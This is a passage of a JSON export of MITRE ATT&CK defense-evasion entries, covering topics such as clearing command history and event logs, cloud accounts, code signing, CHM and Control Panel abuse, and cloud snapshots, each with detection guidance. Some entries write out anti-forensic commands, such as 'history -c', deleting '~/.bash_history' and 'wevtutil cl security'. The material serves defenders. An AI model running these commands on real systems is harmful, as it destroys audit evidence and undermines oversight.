(3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":524,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":528,"name":"T1070.003 - Clear Command History","sort_id":0,"external_id":"T1070.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. macOS and Linux both keep track of the commands users type in their terminal so that users can retrace what they've done.<\/p>\n<p>These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE<\/code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~\/.bash_history<\/code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.<\/p>\n<p>Adversaries can use a variety of methods to prevent their own commands from appear in these logs, such as clearing the history environment variable (<code>unset HISTFILE<\/code>), setting the command history size to zero (<code>export HISTFILESIZE=0<\/code>), manually clearing the history (<code>history -c<\/code>), or deleting the bash history file <code>rm ~\/.bash_history<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"User authentication, especially via remote terminal services like SSH, without new entries in that user's <code>~\/.bash_history<\/code> is suspicious. Additionally, the modification of the <code>HISTFILE<\/code> and <code>HISTFILESIZE<\/code> environment variables or the removal\/clearing of the <code>~\/.bash_history<\/code> file are indicators of suspicious activity.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":528,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":528,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":529,"name":"T1070.002 - Clear Linux or Mac System Logs","sort_id":0,"external_id":"T1070.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>\/var\/log\/<\/code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)<\/p>\n<ul>\n<li><code>\/var\/log\/messages:<\/code>: General and system-related messages<\/li>\n<li><code>\/var\/log\/secure<\/code> or <code>\/var\/log\/auth.log<\/code>: Authentication logs<\/li>\n<li><code>\/var\/log\/utmp<\/code> or <code>\/var\/log\/wtmp<\/code>: Login records<\/li>\n<li><code>\/var\/log\/kern.log<\/code>: Kernel logs<\/li>\n<li><code>\/var\/log\/cron.log<\/code>: Crond logs<\/li>\n<li><code>\/var\/log\/maillog<\/code>: Mail server logs<\/li>\n<li><code>\/var\/log\/httpd\/<\/code>: Web server access and error logs<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"File system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":529,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":529,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":530,"name":"T1070.001 - Clear Windows Event Logs","sort_id":0,"external_id":"T1070.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.<\/p>\n<p>The event logs can be cleared with the following utility commands:<\/p>\n<ul>\n<li><code>wevtutil cl system<\/code><\/li>\n<li><code>wevtutil cl application<\/code><\/li>\n<li><code>wevtutil cl security<\/code><\/li>\n<\/ul>\n<p>These logs may also be cleared through other mechanisms, such as the event viewer GUI or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: \"The audit log was cleared\").","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":530,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":533,"name":"T1078.004 - Cloud Accounts","sort_id":0,"external_id":"T1078.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)<\/p>\n<p>Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1199\">Trusted Relationship<\/a>. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\/002\">Domain Accounts<\/a>, compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Perform regular audits of cloud accounts to detect abnormal or malicious activity, such as accessing information outside of the normal function of the account or account usage at atypical hours.","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":533,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":533,"platform_id":5,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":533,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":533,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":533,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":533,"platform_id":9,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":536,"name":"T1553.002 - Code Signing","sort_id":0,"external_id":"T1553.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\/001\">Invalid Code Signature<\/a>, this activity will result in a valid signature.<\/p>\n<p>Code signing to verify software on first run can be used on modern Windows and macOS\/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing) <\/p>\n<p>Code signing certificates may be used to bypass security policies that require signed code to execute on a system. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":536,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":536,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":537,"name":"T1027.004 - Compile After Delivery","sort_id":0,"external_id":"T1027.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables\/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC\/MinGW.(Citation: ClearSky MuddyWater Nov 2018)<\/p>\n<p>Source code payloads may also be encrypted, encoded, and\/or embedded within other files, such as those delivered as a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\">Phishing<\/a>. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS\/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC\/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and\/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these should only be used in specific and limited cases, like for software development.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":537,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":537,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":537,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":538,"name":"T1218.001 - Compiled HTML File","sort_id":0,"external_id":"T1218.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting\/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)<\/p>\n<p>A custom CHM file containing embedded payloads could be delivered to a victim then triggered by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a>. CHM execution may also bypass application application control on older and\/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and\/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.\n\nMonitor presence and use of CHM files, especially if they are not typically used within an environment.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":538,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":547,"name":"T1218.002 - Control Panel","sort_id":0,"external_id":"T1218.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet<\/code> function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)<\/p>\n<p>For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)<\/p>\n<p>Malicious Control Panel items can be delivered via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\">Phishing<\/a> campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and\/or file extension allow lists.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the <code>Control_RunDLL<\/code> and <code>ControlRunDLLAsUser<\/code> API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl<\/code>) before [Rundll32](https:\/\/attack.mitre.org\/techniques\/T1218\/011) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl<\/code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https:\/\/attack.mitre.org\/techniques\/T1218\/011) command, which may bypass detections and\/or execution filters for control.exe. (Citation: TrendMicro CPL Malware Jan 2014)\n\nInventory Control Panel items to locate unregistered and potentially malicious files present on systems:\n\n* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace<\/code> and <code>HKEY_CLASSES_ROOT\\CLSID\\{GUID}<\/code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)\n* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>Cpls<\/code> and <code>Extended Properties<\/code> Registry keys of <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel<\/code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(\"c:\\windows\\system32\\control.exe {Canonical_Name}\", SW_NORMAL);<\/code>) or from a command line (<code>control.exe \/name {Canonical_Name}<\/code>). (Citation: Microsoft Implementing CPL)\n* Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Controls Folder\\{name}\\Shellex\\PropertySheetHandlers<\/code> where {name} is the predefined name of the system item. (Citation: Microsoft Implementing CPL)\n\nAnalyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques. (Citation: TrendMicro CPL Malware Jan 2014)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":547,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":548,"name":"T1578.002 - Create Cloud Instance","sort_id":0,"external_id":"T1578.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may <a href=\"https:\/\/attack.mitre.org\/techniques\/T1578\/001\">Create Snapshot<\/a> of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect <a href=\"https:\/\/attack.mitre.org\/techniques\/T1005\">Data from Local System<\/a> or for <a href=\"https:\/\/attack.mitre.org\/techniques\/T1074\/002\">Remote Data Staging<\/a>.(Citation: Mandiant M-Trends 2020)<\/p>\n<p>Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.\n\nIn AWS, CloudTrail logs capture the creation of an instance in the <code>RunInstances<\/code> event, and in Azure the creation of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances create<\/code> to create a VM.(Citation: Cloud Audit Logs)","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":548,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":548,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":548,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":549,"name":"T1134.002 - Create Process with Token","sort_id":0,"external_id":"T1134.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with <code>DuplicateToken(Ex)<\/code> and use it with <code>CreateProcessWithTokenW<\/code> to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas<\/code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)<\/code> and <code>CreateProcessWithTokenW<\/code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":549,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":550,"name":"T1578.001 - Create Snapshot","sort_id":0,"external_id":"T1578.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1536\">Revert Cloud Instance<\/a> where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.<\/p>\n<p>An adversary may <a href=\"https:\/\/attack.mitre.org\/techniques\/T1578\/002\">Create Cloud Instance<\/a>, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.\n\nIn AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.(Citation: AWS Cloud Trail Backup API).\n\nIn Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs.(Citation: Azure - Monitor Logs)\n\nGoogle's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the <code>gcloud compute instances create<\/code> command to create a new VM disk from a snapshot.(Citation: Cloud Audit Logs) It is also possible to detect the usage of the GCP API with the <code>\"sourceSnapshot\":<\/code> parameter pointed to <code>\"global\/snapshots\/[BOOT_SNAPSHOT_NAME]<\/code>.(Citation: GCP - Creating and Starting a VM)","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":550,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":550,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":550,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":566,"name":"T1078.001 - Default Accounts","sort_id":0,"external_id":"T1078.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory\/provider set accounts on other types of systems, software, or devices.(Citation: Microsoft Local Accounts Feb 2019)<\/p>\n<p>Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen <a href=\"https:\/\/attack.mitre.org\/techniques\/T1552\/004\">Private Keys<\/a> or credential materials to legitimately connect to remote environments via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\">Remote Services<\/a>.(Citation: Metasploit SSH Module)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":5,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":566,"platform_id":9,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":567,"name":"T1578.003 - Delete Cloud Instance","sort_id":0,"external_id":"T1578.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.<\/p>\n<p>An adversary may also <a href=\"https:\/\/attack.mitre.org\/techniques\/T1578\/002\">Create Cloud Instance<\/a> and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.\n\nIn AWS, CloudTrail logs capture the deletion of an instance in the <code>TerminateInstances<\/code> event, and in Azure the deletion of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances delete<\/code> to delete a VM.(Citation: Cloud Audit Logs)","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":567,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":567,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 